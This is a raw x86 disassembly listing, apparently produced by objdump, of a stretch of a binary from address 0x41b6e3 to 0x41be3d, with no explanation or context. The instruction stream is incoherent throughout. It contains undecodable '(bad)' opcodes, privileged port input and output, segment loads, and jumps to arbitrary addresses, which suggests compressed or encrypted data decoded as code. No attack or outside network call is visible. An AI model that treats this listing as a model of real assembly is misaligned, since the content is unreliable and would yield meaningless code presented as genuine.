  41b6e3:	jmp    0x6a9ab676
  41b6e8:	jle    0x41b6a9
  41b6ea:	and    BYTE PTR [eax-0xd76e1b1],0x73
  41b6f1:	mov    edi,0x403cb1b7
  41b6f6:	out    0x54,al
  41b6f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b6f9:	push   ebp
  41b6fa:	sub    DWORD PTR [eax+0x1aa157d5],edx
  41b700:	mov    gs,WORD PTR [esi]
  41b702:	test   DWORD PTR [ebp*2-0x7b77bbd7],ebp
  41b709:	pusha  
  41b70a:	out    dx,al
  41b70b:	push   ecx
  41b70c:	mov    edx,0x2832a079
  41b711:	ds clc 
  41b713:	ss dec ecx
  41b715:	ins    BYTE PTR es:[edi],dx
  41b716:	dec    esp
  41b717:	mov    BYTE PTR [ecx-0x34],bl
  41b71a:	pop    ebp
  41b71b:	xchg   edi,eax
  41b71c:	daa    
  41b71d:	mov    dl,0x5e
  41b71f:	adc    al,ch
  41b721:	inc    edi
  41b722:	jecxz  0x41b6b5
  41b724:	ror    ah,1
  41b726:	aam    0xda
  41b728:	mov    ah,0xe0
  41b72a:	dec    ebp
  41b72b:	adc    BYTE PTR [ecx+0x37],0x3
  41b72f:	loope  0x41b785
  41b731:	inc    eax
  41b732:	inc    edx
  41b733:	mov    edx,0xf9ba738d
  41b738:	out    dx,eax
  41b739:	or     ch,BYTE PTR [ebp+0x752c61bd]
  41b73f:	or     al,0x34
  41b741:	loope  0x41b7a5
  41b743:	rcr    DWORD PTR [edi-0x63],1
  41b746:	sti    
  41b747:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b748:	sbb    esp,DWORD PTR [edi-0x41cfd9fd]
  41b74e:	shl    DWORD PTR [edi],cl
  41b750:	jbe    0x41b77f
  41b752:	mul    BYTE PTR [ebx]
  41b754:	jg     0x41b74c
  41b756:	outs   dx,DWORD PTR ds:[esi]
  41b757:	sahf   
  41b758:	inc    ecx
  41b759:	xchg   esp,eax
  41b75a:	ret    
  41b75b:	sar    BYTE PTR [eax],0x92
  41b75e:	inc    edi
  41b75f:	adc    al,0xdc
  41b761:	push   edi
  41b762:	or     bh,BYTE PTR [esi+0x27f2d8a]
  41b768:	and    ebp,DWORD PTR [edx]
  41b76a:	push   0xffffffdc
  41b76c:	dec    ecx
  41b76d:	aam    0xe8
  41b76f:	fld    QWORD PTR [ecx-0x2b]
  41b772:	dec    edx
  41b773:	xchg   BYTE PTR [ecx-0x46],ch
  41b776:	lea    eax,[ebx]
  41b778:	stos   DWORD PTR es:[edi],eax
  41b779:	jp     0x41b7ed
  41b77b:	pop    es
  41b77c:	sub    BYTE PTR [ebx+0x21],0xe3
  41b780:	dec    eax
  41b781:	test   DWORD PTR [ecx],ebp
  41b783:	lock inc ebx
  41b785:	jle    0x41b77f
  41b787:	mov    bh,0x95
  41b789:	sbb    al,0xf2
  41b78b:	mov    ebx,0xfab9e60
  41b790:	jnp    0x41b755
  41b792:	inc    ebp
  41b793:	mov    ds:0xb9b47c36,al
  41b798:	inc    eax
  41b799:	push   ecx
  41b79a:	int3   
  41b79b:	push   eax
  41b79c:	and    eax,0x960e819
  41b7a1:	leave  
  41b7a2:	loop   0x41b798
  41b7a4:	or     bh,0xbf
  41b7a7:	mov    gs,ebx
  41b7a9:	rcl    BYTE PTR [esi+0x37],cl
  41b7ac:	add    al,0x14
  41b7ae:	or     esp,DWORD PTR [ebp-0x66]
  41b7b1:	stc    
  41b7b2:	adc    esi,ebx
  41b7b4:	aas    
  41b7b5:	pop    ecx
  41b7b6:	vmwrite eax,DWORD PTR [eax+0x75a796cc]
  41b7bd:	add    eax,0xb79455b4
  41b7c2:	mov    dh,0x83
  41b7c4:	pop    ss
  41b7c5:	std    
  41b7c6:	jecxz  0x41b7f6
  41b7c8:	retf   
  41b7c9:	enter  0xac4f,0xf1
  41b7cd:	(bad)  
  41b7ce:	jbe    0x41b75d
  41b7d0:	std    
  41b7d1:	jl     0x41b7f2
  41b7d3:	mov    bl,BYTE PTR [ecx]
  41b7d5:	push   0x46
  41b7d7:	mov    esi,0x8a03edb2
  41b7dc:	adc    al,0x85
  41b7de:	adc    bl,BYTE PTR [ebp+ebp*2+0x40602c28]
  41b7e5:	dec    esp
  41b7e6:	cmp    BYTE PTR ds:0x2050eeef,dh
  41b7ec:	popw   es
  41b7ee:	js     0x41b779
  41b7f0:	mov    bh,0x63
  41b7f2:	jmp    0x41b804
  41b7f4:	sbb    dh,BYTE PTR [eax+edx*2-0x48a48a11]
  41b7fb:	jmp    0x41b7c3
  41b7fd:	out    dx,eax
  41b7fe:	pop    esp
  41b7ff:	repz mov ds:0x5148f57a,al
  41b805:	push   ecx
  41b806:	es scas al,BYTE PTR es:[edi]
  41b808:	jge    0x41b83c
  41b80a:	xor    dh,BYTE PTR [eax+0x4e171957]
  41b810:	iret   
  41b811:	mov    ebx,0xd5a96cf4
  41b816:	jecxz  0x41b80f
  41b818:	cmp    BYTE PTR [edi],ch
  41b81a:	xor    BYTE PTR [ecx],ch
  41b81c:	cwde   
  41b81d:	aad    0x6a
  41b81f:	sar    BYTE PTR [esi],1
  41b821:	out    0xf0,eax
  41b823:	fisubr WORD PTR [ebp+edx*2-0x76a1f279]
  41b82a:	dec    esi
  41b82b:	push   ds
  41b82c:	adc    ch,0x7f
  41b82f:	push   ds
  41b830:	mov    ds,WORD PTR [ebp-0x500e95f7]
  41b836:	loop   0x41b89e
  41b838:	lahf   
  41b839:	inc    ebx
  41b83a:	loop   0x41b7ef
  41b83c:	ror    DWORD PTR [esp+eiz*8-0x2],cl
  41b840:	imul   DWORD PTR [ebp+0x54]
  41b843:	test   al,0xf0
  41b845:	xchg   esp,edi
  41b847:	ins    BYTE PTR es:[edi],dx
  41b848:	es cmp eax,0x9700334
  41b84e:	idiv   DWORD PTR [edi+ebx*8+0x1e]
  41b852:	imul   ebp,DWORD PTR ds:0x88329865,0xd3a11911
  41b85c:	fst    DWORD PTR [esi+esi*4]
  41b85f:	and    al,0xed
  41b861:	dec    ebx
  41b862:	jo     0x41b88a
  41b864:	(bad)  
  41b865:	xchg   ebp,eax
  41b866:	adc    al,0x5d
  41b868:	xchg   edi,eax
  41b869:	es cwde 
  41b86b:	fild   DWORD PTR [eax]
  41b86d:	sbb    eax,0xec189b81
  41b872:	enter  0xe721,0x50
  41b876:	push   ds
  41b877:	cmp    eax,DWORD PTR [esi]
  41b879:	sub    edx,edi
  41b87b:	cmp    al,0x45
  41b87d:	pop    esi
  41b87e:	cmp    edi,DWORD PTR [esi+0x48b348f1]
  41b884:	(bad)  
  41b885:	es call 0x310af626
  41b88b:	and    al,0x6b
  41b88d:	adc    al,0x98
  41b88f:	mov    ebp,0x4fc20de1
  41b894:	sbb    eax,0x6ec446ad
  41b899:	xchg   DWORD PTR [ebp-0x6b],eax
  41b89c:	and    al,0xe7
  41b89e:	jns    0x41b8ef
  41b8a0:	push   0x617732d8
  41b8a5:	mov    bh,0xff
  41b8a7:	ss cmp al,0xf1
  41b8aa:	ror    BYTE PTR [esi],0xb
  41b8ad:	mov    WORD PTR [esi],?
  41b8af:	add    bl,BYTE PTR [edi+0x3]
  41b8b2:	sub    DWORD PTR [eax-0x32],ebp
  41b8b5:	ss xchg edi,eax
  41b8b7:	inc    ebp
  41b8b8:	clc    
  41b8b9:	cwde   
  41b8ba:	mov    WORD PTR [edi],ss
  41b8bc:	out    dx,eax
  41b8bd:	fisttp WORD PTR [ebx]
  41b8bf:	mov    ah,0xf2
  41b8c1:	mov    ds:0x39f6128d,al
  41b8c6:	jmp    FWORD PTR [ecx]
  41b8c8:	(bad)  
  41b8c9:	shl    BYTE PTR [eax+0x136b3614],1
  41b8cf:	mov    ebx,0x2a62a631
  41b8d4:	(bad)  
  41b8d5:	lds    eax,FWORD PTR [eax-0x484bfe73]
  41b8db:	outs   dx,BYTE PTR ds:[esi]
  41b8dc:	and    dl,ah
  41b8de:	inc    esp
  41b8df:	pop    esp
  41b8e0:	outs   dx,DWORD PTR ds:[esi]
  41b8e1:	pop    esi
  41b8e2:	(bad)  
  41b8e3:	pop    eax
  41b8e4:	sub    edx,DWORD PTR [ebp-0x76]
  41b8e7:	cmc    
  41b8e8:	lods   al,BYTE PTR ds:[esi]
  41b8e9:	add    eax,DWORD PTR [esi+0x7b6bda5b]
  41b8ef:	lds    esp,FWORD PTR [ebp-0x6b]
  41b8f2:	mov    DWORD PTR [eax-0x2c],edx
  41b8f5:	ja     0x41b950
  41b8f7:	jmp    0xe4cc1501
  41b8fc:	sub    esp,DWORD PTR [edx-0x46]
  41b8ff:	in     al,dx
  41b900:	add    bh,BYTE PTR [edi-0x5e]
  41b903:	xor    eax,0xfad6679f
  41b908:	das    
  41b909:	ja     0x41b89a
  41b90b:	fwait
  41b90c:	push   esi
  41b90d:	in     eax,0x2d
  41b90f:	test   DWORD PTR [edx],ebx
  41b911:	sub    eax,0x753963f7
  41b916:	pop    esp
  41b917:	retf   
  41b918:	test   DWORD PTR [ebp+0x3e198e60],esp
  41b91e:	push   edx
  41b91f:	enter  0x77c0,0x50
  41b923:	out    0x17,al
  41b925:	shl    DWORD PTR [esi-0x3f445574],cl
  41b92b:	lods   eax,DWORD PTR ds:[esi]
  41b92c:	adc    ecx,edx
  41b92e:	xlat   BYTE PTR ds:[ebx]
  41b92f:	fdivr  DWORD PTR [edx+0x29]
  41b932:	cmc    
  41b933:	enter  0x5747,0xc
  41b937:	mov    al,0x68
  41b939:	inc    esi
  41b93a:	push   cs
  41b93b:	loope  0x41b942
  41b93d:	push   ecx
  41b93e:	xor    dl,BYTE PTR [ecx-0x43]
  41b941:	mov    cl,dl
  41b943:	xchg   BYTE PTR [ebp+0x41],bl
  41b946:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b947:	ficomp WORD PTR [edi-0x56]
  41b94a:	shl    DWORD PTR [edx+eiz*2],cl
  41b94d:	push   edx
  41b94e:	cmp    BYTE PTR [eax+0x73c61d1d],bl
  41b954:	dec    ecx
  41b955:	mov    dl,0x93
  41b957:	add    al,0x18
  41b959:	xchg   edi,eax
  41b95a:	ret    0x13ea
  41b95d:	jp     0x41b927
  41b95f:	dec    eax
  41b960:	add    ecx,DWORD PTR [ebp+0x2b]
  41b963:	dec    ebx
  41b964:	nop
  41b965:	leave  
  41b966:	jge    0x41b907
  41b968:	int3   
  41b969:	sub    DWORD PTR [esi],0xd770d197
  41b96f:	sub    al,0x18
  41b971:	dec    edi
  41b972:	mov    cl,0x1c
  41b974:	inc    eax
  41b975:	lahf   
  41b976:	sub    al,0xfb
  41b978:	lock into 
  41b97a:	sub    eax,0x1b2c9caf
  41b97f:	inc    edi
  41b980:	xchg   ebp,eax
  41b981:	push   edx
  41b982:	add    bl,dl
  41b984:	popa   
  41b985:	add    al,0x13
  41b987:	mov    ds,WORD PTR [edi+0x40]
  41b98a:	popa   
  41b98b:	sbb    eax,0xbe277432
  41b990:	mov    eax,ds:0x1ddb5199
  41b995:	outs   dx,DWORD PTR ds:[esi]
  41b996:	ss or  al,0x93
  41b999:	and    BYTE PTR [edx],bl
  41b99b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b99c:	sbb    DWORD PTR [esi],edx
  41b99e:	call   0x7f913eeb
  41b9a3:	add    al,0x42
  41b9a5:	xchg   DWORD PTR [edi],ecx
  41b9a7:	sbb    esp,DWORD PTR [ecx+ecx*1-0x610a22b5]
  41b9ae:	fs popa 
  41b9b0:	xor    al,0x73
  41b9b2:	add    al,0xb0
  41b9b4:	cli    
  41b9b5:	xchg   edx,eax
  41b9b6:	clc    
  41b9b7:	clc    
  41b9b8:	cwde   
  41b9b9:	pushf  
  41b9ba:	add    edx,esp
  41b9bc:	push   ebp
  41b9bd:	jle    0x41b9ac
  41b9bf:	out    0x92,eax
  41b9c1:	jnp    0x41b98c
  41b9c3:	mov    bl,0x79
  41b9c5:	push   ss
  41b9c6:	ret    
  41b9c7:	cmp    eax,0x5c7161e4
  41b9cc:	bound  ecx,QWORD PTR [edx-0x68]
  41b9cf:	jb     0x41ba08
  41b9d1:	aad    0x8d
  41b9d3:	loop   0x41b975
  41b9d5:	addr16 je 0x41ba0d
  41b9d8:	add    ecx,0xffffffad
  41b9db:	sub    cl,BYTE PTR [edx]
  41b9dd:	push   0xffffffe9
  41b9df:	mov    cl,0xc0
  41b9e1:	fisttp QWORD PTR [edi]
  41b9e3:	andps  xmm7,XMMWORD PTR [ebx+edx*4]
  41b9e7:	pop    ds
  41b9e8:	jge    0x41b9a1
  41b9ea:	leave  
  41b9eb:	inc    ebp
  41b9ec:	cmp    ebp,DWORD PTR [edi-0x72]
  41b9ef:	dec    ecx
  41b9f0:	fidivr WORD PTR [edi+eax*1]
  41b9f3:	push   ebp
  41b9f4:	inc    edx
  41b9f5:	or     al,0xa1
  41b9f7:	ret    0xcda6
  41b9fa:	push   esi
  41b9fb:	aad    0x4b
  41b9fd:	xlat   BYTE PTR ds:[ebx]
  41b9fe:	sub    edx,DWORD PTR [edi+0x27ff340a]
  41ba04:	out    dx,eax
  41ba05:	retf   0x4c91
  41ba08:	cmp    BYTE PTR [ebp+0x60d3c69],bh
  41ba0e:	es mov edx,0xab28f4aa
  41ba14:	in     al,0x3e
  41ba16:	in     al,0x1a
  41ba18:	loopne 0x41ba0b
  41ba1a:	or     al,BYTE PTR [ebx+0x62cb9a46]
  41ba20:	jmp    0x41ba8f
  41ba22:	in     al,dx
  41ba23:	push   0xd17a55a4
  41ba28:	add    esp,DWORD PTR [ecx]
  41ba2a:	inc    edi
  41ba2b:	jns    0x41ba0c
  41ba2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ba2e:	jb     0x41ba8d
  41ba30:	mov    dh,0xc
  41ba32:	mov    eax,ds:0xd548845b
  41ba37:	retf   0xe06d
  41ba3a:	cmp    DWORD PTR [edi+0xd],0xb7cb296b
  41ba41:	int    0x20
  41ba43:	mov    bh,0xa1
  41ba45:	js     0x41bab9
  41ba47:	ret    0x5564
  41ba4a:	les    ebx,FWORD PTR [esi-0x38]
  41ba4d:	sub    BYTE PTR [edx-0xbea6b3a],al
  41ba53:	mov    dl,0xfd
  41ba55:	pushf  
  41ba56:	adc    eax,0x963a557d
  41ba5b:	pop    ds
  41ba5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ba5d:	scas   eax,DWORD PTR es:[edi]
  41ba5e:	jnp    0x41ba8b
  41ba60:	cmp    cl,BYTE PTR [esi-0x37]
  41ba63:	cwde   
  41ba64:	fimul  DWORD PTR [ecx+0x8eb17c1]
  41ba6a:	jp     0x41ba8b
  41ba6c:	xor    DWORD PTR [edx+0x37],ebx
  41ba6f:	inc    ebx
  41ba70:	imul   ebx,DWORD PTR [ebx+0x1e1e6200],0xffffffaf
  41ba77:	push   ecx
  41ba78:	cmc    
  41ba79:	jmp    0x41bab7
  41ba7b:	or     eax,0xd74d8299
  41ba80:	or     ch,bh
  41ba82:	in     al,dx
  41ba83:	scas   eax,DWORD PTR es:[edi]
  41ba84:	jg     0x41ba9a
  41ba86:	push   ss
  41ba87:	jp     0x41ba38
  41ba89:	retf   
  41ba8a:	into   
  41ba8b:	ds xor bh,dl
  41ba8e:	dec    eax
  41ba8f:	inc    esi
  41ba90:	adc    BYTE PTR [edi+0x4d],0x6
  41ba94:	arpl   sp,bx
  41ba96:	push   esp
  41ba97:	loopne 0x41ba4c
  41ba99:	mov    ds:0x2b535bd2,al
  41ba9e:	fisubr DWORD PTR [esi-0x43c7fd0]
  41baa4:	test   al,0x35
  41baa6:	dec    edx
  41baa7:	mov    dl,ah
  41baa9:	xor    ah,BYTE PTR [esi+ebx*2]
  41baac:	in     eax,0xee
  41baae:	retf   
  41baaf:	mov    edx,DWORD PTR [eax-0x17aae8f1]
  41bab5:	push   es
  41bab6:	icebp  
  41bab7:	mov    DWORD PTR es:[ebp+0x2aae463b],eax
  41babe:	inc    eax
  41babf:	mov    ds:0xe5eb7a9f,al
  41bac4:	adc    BYTE PTR [esp+ebp*4+0x31],bh
  41bac8:	jp     0x41baf3
  41baca:	push   cs
  41bacb:	jg     0x41baef
  41bacd:	mov    ds,WORD PTR [eax]
  41bacf:	or     eax,0xa23b94bf
  41bad4:	mov    eax,ds:0xb41bbe28
  41bad9:	in     eax,0x7f
  41badb:	repnz sub edx,esp
  41bade:	and    BYTE PTR ds:[ecx-0x6e386197],0x34
  41bae6:	mov    ebp,0xcb03b41d
  41baeb:	push   ds
  41baec:	rcl    DWORD PTR [esi*1+0x74b7432d],cl
  41baf3:	shl    BYTE PTR [edx+ebp*2],cl
  41baf6:	add    BYTE PTR [ebp+0x54cc65f2],0xeb
  41bafd:	inc    edx
  41bafe:	sbb    dl,BYTE PTR [ebx-0x45942ca8]
  41bb04:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  41bb06:	ss mov bh,0x3a
  41bb09:	ins    BYTE PTR es:[edi],dx
  41bb0a:	mov    al,0xfa
  41bb0c:	cwde   
  41bb0d:	pop    esi
  41bb0e:	pop    esi
  41bb0f:	push   ss
  41bb10:	mov    eax,0x9e5b83d8
  41bb15:	cmp    eax,0xbf3cbec9
  41bb1a:	loopne 0x41baeb
  41bb1c:	pop    esp
  41bb1d:	mov    edx,0xb4dc8960
  41bb22:	test   BYTE PTR [eax],0x74
  41bb25:	push   ecx
  41bb26:	push   ecx
  41bb27:	(bad)  
  41bb28:	in     eax,0x7
  41bb2a:	push   ebp
  41bb2b:	sbb    eax,0x6f5dd6d7
  41bb30:	popf   
  41bb31:	or     bl,BYTE PTR [ebp-0x5de074a4]
  41bb37:	rol    BYTE PTR [esp+ebp*8-0x2a32eeb1],cl
  41bb3e:	dec    ecx
  41bb3f:	jmp    0x96c4:0xa3b45d58
  41bb46:	test   eax,esi
  41bb48:	adc    eax,edi
  41bb4a:	and    eax,0x82282bc
  41bb4f:	jge    0x41bb10
  41bb51:	jg     0x41bada
  41bb53:	mov    ebx,gs
  41bb55:	push   ss
  41bb56:	push   ds
  41bb57:	aaa    
  41bb58:	(bad)  
  41bb59:	iret   
  41bb5a:	dec    ecx
  41bb5b:	mov    ds:0xc18cd0d1,al
  41bb60:	lock dec edx
  41bb62:	imul   ecx,esi,0x1c
  41bb65:	sbb    ebx,DWORD PTR [esi+0x25]
  41bb68:	loop   0x41bb34
  41bb6a:	pushf  
  41bb6b:	(bad)  
  41bb6c:	jbe    0x41bbad
  41bb6e:	or     DWORD PTR [edi+0x14],esp
  41bb71:	mov    bl,0xfa
  41bb73:	popf   
  41bb74:	sub    edx,DWORD PTR [ebx+ebp*1-0x1d79182f]
  41bb7b:	lock adc al,BYTE PTR [ebp+0x67]
  41bb7f:	retf   
  41bb80:	retf   0x1600
  41bb83:	arpl   WORD PTR [edi+0x35a45dd3],bx
  41bb89:	in     al,0xae
  41bb8b:	sub    edx,eax
  41bb8d:	lods   al,BYTE PTR ds:[esi]
  41bb8e:	test   ebx,esp
  41bb90:	adc    cl,0x8c
  41bb93:	dec    ebx
  41bb94:	mov    si,0xc0d6
  41bb98:	mov    esp,0x1973f33a
  41bb9d:	ficomp DWORD PTR [edx-0xa]
  41bba0:	clc    
  41bba1:	mov    ebp,0xcc32a283
  41bba6:	test   eax,0xe1dd48fa
  41bbab:	fadd   QWORD PTR [ebp-0x6d813de4]
  41bbb1:	into   
  41bbb2:	xlat   BYTE PTR ds:[ebx]
  41bbb3:	mov    al,0xa3
  41bbb5:	sti    
  41bbb6:	adc    BYTE PTR [ebp+0xca326c5],bl
  41bbbc:	imul   esp,DWORD PTR [ecx-0x3fedad24],0xffffffd1
  41bbc3:	mov    al,ds:0xd569c711
  41bbc8:	and    eax,0x8d176948
  41bbcd:	dec    edi
  41bbce:	mov    ds:0xa610ca8b,al
  41bbd3:	push   cs
  41bbd4:	shl    edi,0x0
  41bbd7:	dec    ebp
  41bbd8:	aam    0x37
  41bbda:	sbb    DWORD PTR [esi],ebp
  41bbdc:	inc    eax
  41bbdd:	mov    BYTE PTR [ebx],cl
  41bbdf:	shl    DWORD PTR [ecx-0x20f109d0],0xcd
  41bbe6:	fldenv [esi+0x59]
  41bbe9:	mov    ds:0xae91ebeb,eax
  41bbee:	stos   DWORD PTR es:[edi],eax
  41bbef:	mov    DWORD PTR [esi-0x59],ebx
  41bbf2:	lock nop
  41bbf4:	cmp    eax,0xc55138b6
  41bbf9:	in     al,0x7
  41bbfb:	xor    al,0x5b
  41bbfd:	adc    DWORD PTR ds:0xd1777b80,ebx
  41bc03:	xchg   edi,eax
  41bc04:	imul   eax,DWORD PTR [ebx+ebp*2],0xbf274a3c
  41bc0b:	push   ebx
  41bc0c:	jmp    0x447db194
  41bc11:	outs   dx,DWORD PTR ds:[esi]
  41bc12:	xchg   edx,eax
  41bc13:	xor    eax,0x87cadc51
  41bc18:	cmp    DWORD PTR [esi-0x41b7ed79],esi
  41bc1e:	fs mov edx,0x136f7d6c
  41bc24:	sbb    al,0x21
  41bc26:	(bad)  
  41bc27:	mov    bl,0x78
  41bc29:	jl     0x41bc2a
  41bc2b:	sbb    al,0x54
  41bc2d:	loop   0x41bc67
  41bc2f:	inc    ebx
  41bc30:	das    
  41bc31:	jae    0x41bbb8
  41bc33:	into   
  41bc34:	or     al,0xb6
  41bc36:	inc    eax
  41bc37:	mov    bh,0x7b
  41bc39:	fmul   QWORD PTR [ecx-0x9]
  41bc3c:	or     DWORD PTR [ecx+0x3],esp
  41bc3f:	xor    eax,0xa10a8615
  41bc44:	enter  0x9c42,0xa8
  41bc48:	test   al,0x87
  41bc4a:	inc    esi
  41bc4b:	jns    0x41bc68
  41bc4d:	cmp    ebx,edx
  41bc4f:	int3   
  41bc50:	ror    DWORD PTR [eax+0x10],1
  41bc53:	outs   dx,DWORD PTR ds:[esi]
  41bc54:	cmp    BYTE PTR [ebx],dl
  41bc56:	fwait
  41bc57:	push   edx
  41bc58:	mov    eax,0xdc0ce88f
  41bc5d:	arpl   WORD PTR [ebp-0x1e],bx
  41bc60:	mov    bh,cl
  41bc62:	imul   ebx,edi,0xb8f30157
  41bc68:	test   BYTE PTR [ecx+edi*1],dh
  41bc6b:	push   eax
  41bc6c:	xchg   esp,eax
  41bc6d:	xchg   esi,eax
  41bc6e:	adc    esp,DWORD PTR [ebx+ecx*8+0x60f82f41]
  41bc75:	push   ebp
  41bc76:	mov    eax,0x8b031ad3
  41bc7b:	mov    BYTE PTR [esp-0x18cd7ec],dh
  41bc82:	jecxz  0x41bcb3
  41bc84:	loop   0x41bc23
  41bc86:	pop    esp
  41bc87:	cwde   
  41bc88:	lea    esp,[si-0x13]
  41bc8c:	jne    0x41bc6a
  41bc8e:	mov    ebx,0xdbee1a39
  41bc93:	les    ebp,FWORD PTR [ebp-0x27]
  41bc96:	and    DWORD PTR [esp+ecx*8],0x41
  41bc9a:	mov    esp,0xa9672330
  41bc9f:	sub    DWORD PTR [ecx+0x5e],esi
  41bca2:	fisub  WORD PTR [ebx+ebx*2]
  41bca5:	pop    ecx
  41bca6:	xchg   edx,eax
  41bca7:	cs jmp 0x41bc32
  41bcaa:	scas   al,BYTE PTR es:[edi]
  41bcab:	lods   al,BYTE PTR ds:[esi]
  41bcac:	lea    ebx,[ebp-0x16]
  41bcaf:	int    0xd1
  41bcb1:	xor    al,0x95
  41bcb3:	push   ss
  41bcb4:	pusha  
  41bcb5:	mov    edi,0x7a10b345
  41bcba:	aaa    
  41bcbb:	hlt    
  41bcbc:	(bad)  
  41bcbd:	cmp    esp,ebx
  41bcbf:	adc    al,0xcc
  41bcc1:	mov    BYTE PTR [eax-0x15],cl
  41bcc4:	jns    0x41bc98
  41bcc6:	inc    DWORD PTR [eax+0x7b61148e]
  41bccc:	mov    eax,ds:0x3489e2e9
  41bcd1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bcd2:	fidiv  WORD PTR [esi-0xd]
  41bcd5:	daa    
  41bcd6:	sti    
  41bcd7:	sub    edi,DWORD PTR [edx]
  41bcd9:	nop
  41bcda:	mov    ds:0xfb54c9c7,al
  41bcdf:	mov    edx,0xb0fa87f8
  41bce4:	mov    ebx,0x783e164
  41bce9:	(bad)  
  41bcea:	lea    edi,[edx]
  41bcec:	pop    esi
  41bced:	push   es
  41bcee:	fdiv   DWORD PTR [edx-0x63]
  41bcf1:	add    ch,BYTE PTR es:[esi-0x80]
  41bcf5:	add    DWORD PTR [ebx],esi
  41bcf7:	pop    esi
  41bcf8:	dec    ebx
  41bcf9:	sbb    eax,0xf4240f6c
  41bcfe:	ds push cs
  41bd00:	dec    edi
  41bd01:	jl     0x41bd01
  41bd03:	cmp    bh,ah
  41bd05:	gs xor al,0xaf
  41bd08:	jecxz  0x41bd40
  41bd0a:	mov    edx,DWORD PTR [esi+0x682113bc]
  41bd10:	or     edi,DWORD PTR [ecx+0x4b]
  41bd13:	pop    esi
  41bd14:	pop    ebp
  41bd15:	(bad)  [ecx]
  41bd17:	dec    esp
  41bd18:	sbb    esp,DWORD PTR [ebp-0x31]
  41bd1b:	jnp    0x41bd40
  41bd1d:	retf   
  41bd1e:	xchg   esp,eax
  41bd1f:	int3   
  41bd20:	jnp    0x41bd3b
  41bd22:	pop    esi
  41bd23:	sub    eax,0xa0069eb6
  41bd28:	xor    eax,0x8290c0ff
  41bd2d:	(bad)  
  41bd2e:	int3   
  41bd2f:	xchg   BYTE PTR [edx-0x33fa434b],bh
  41bd35:	inc    esp
  41bd36:	cwde   
  41bd37:	stos   BYTE PTR es:[edi],al
  41bd38:	into   
  41bd39:	adc    al,0x0
  41bd3b:	sub    esp,esp
  41bd3d:	fiadd  DWORD PTR [edi-0x47b6ca7b]
  41bd43:	mov    cl,0xa7
  41bd45:	inc    edx
  41bd46:	bound  edi,QWORD PTR [ecx-0x46]
  41bd49:	jl     0x41bd02
  41bd4b:	addr16 mov ah,0x83
  41bd4e:	int3   
  41bd4f:	adc    eax,0x573d1bbe
  41bd54:	sub    BYTE PTR [edi],ch
  41bd56:	xchg   esp,eax
  41bd57:	push   ds
  41bd58:	push   eax
  41bd59:	add    DWORD PTR [ecx-0x6b],edi
  41bd5c:	mov    WORD PTR [edi],gs
  41bd5e:	imul   sp,dx,0x9ea
  41bd63:	sub    al,0x58
  41bd65:	jae    0x41bdae
  41bd67:	lods   al,BYTE PTR ds:[esi]
  41bd68:	dec    edi
  41bd69:	inc    esp
  41bd6a:	cmc    
  41bd6b:	xor    eax,0xbf8f8623
  41bd70:	pop    ebx
  41bd71:	jecxz  0x41bd1d
  41bd73:	mov    esi,0xcbafd2de
  41bd78:	shl    DWORD PTR [edi],0x3d
  41bd7b:	push   es
  41bd7c:	cmc    
  41bd7d:	inc    DWORD PTR [eax+edx*4]
  41bd80:	leave  
  41bd81:	fwait
  41bd82:	adc    eax,0x1534c276
  41bd87:	sub    BYTE PTR [edi+0x18282c03],0x12
  41bd8e:	fcom   DWORD PTR [di+0x29]
  41bd92:	stos   DWORD PTR es:[edi],eax
  41bd93:	jns    0x41bd89
  41bd95:	aaa    
  41bd96:	push   ebp
  41bd97:	loop   0x41bd19
  41bd99:	scas   al,BYTE PTR es:[edi]
  41bd9a:	sub    eax,0xdd4e5f71
  41bd9f:	mov    eax,ds:0x498014ef
  41bda4:	xlat   BYTE PTR ds:[ebx]
  41bda5:	xchg   edx,eax
  41bda6:	dec    ebp
  41bda7:	and    al,0xe0
  41bda9:	mov    ecx,0xb3245aaf
  41bdae:	sar    ah,cl
  41bdb0:	jmp    0x41bdfc
  41bdb2:	jge    0x41bd5a
  41bdb4:	mov    esp,0xfe6d452a
  41bdb9:	adc    dh,BYTE PTR [eax+0x6e]
  41bdbc:	push   ebx
  41bdbd:	push   cs
  41bdbe:	out    0xc5,al
  41bdc0:	pop    eax
  41bdc1:	fnstenv [ecx+0x6907b98f]
  41bdc7:	in     al,0x7
  41bdc9:	inc    esp
  41bdca:	fild   QWORD PTR [edi+ebx*8-0x61]
  41bdce:	int    0xe2
  41bdd0:	xchg   ebp,eax
  41bdd1:	push   ebx
  41bdd2:	inc    ebx
  41bdd3:	loop   0x41bda6
  41bdd5:	loope  0x41bdc2
  41bdd7:	int    0xc7
  41bdd9:	out    0xb0,al
  41bddb:	jo     0x41bdbb
  41bddd:	dec    ecx
  41bdde:	mov    ebp,0x988ed320
  41bde3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bde4:	mov    ch,0x9b
  41bde6:	jbe    0x41be52
  41bde8:	jg     0x41bdf9
  41bdea:	pop    esp
  41bdeb:	shl    DWORD PTR [ebx-0x37bbc93c],cl
  41bdf1:	inc    ebx
  41bdf2:	mov    edi,0xfcc17d2e
  41bdf7:	adc    bl,BYTE PTR [ecx]
  41bdf9:	in     eax,dx
  41bdfa:	mov    ecx,0xd0d94ea8
  41bdff:	inc    ebp
  41be00:	stos   BYTE PTR es:[edi],al
  41be01:	nop
  41be02:	sub    al,0x57
  41be04:	loope  0x41bd86
  41be06:	push   ds
  41be07:	jbe    0x41be7e
  41be09:	imul   edi,DWORD PTR [ecx],0x67
  41be0c:	push   ecx
  41be0d:	push   edi
  41be0e:	outs   dx,BYTE PTR ds:[esi]
  41be0f:	fldcw  WORD PTR [edi+edx*4-0x2f982717]
  41be16:	mov    eax,0xc7e10452
  41be1b:	push   0x46
  41be1d:	mov    ebx,0x35e3c0f7
  41be22:	xchg   esi,eax
  41be23:	add    bh,BYTE PTR [esi+0x72]
  41be26:	and    eax,0xfb534405
  41be2b:	rol    BYTE PTR [edi+0x352cbfc2],0x49
  41be32:	stc    
  41be33:	lods   al,BYTE PTR ds:[esi]
  41be34:	adc    al,0xb
  41be36:	jecxz  0x41bdb8
  41be38:	mov    ebp,0xecb8bdef
  41be3d:	jmp    0x41bddd
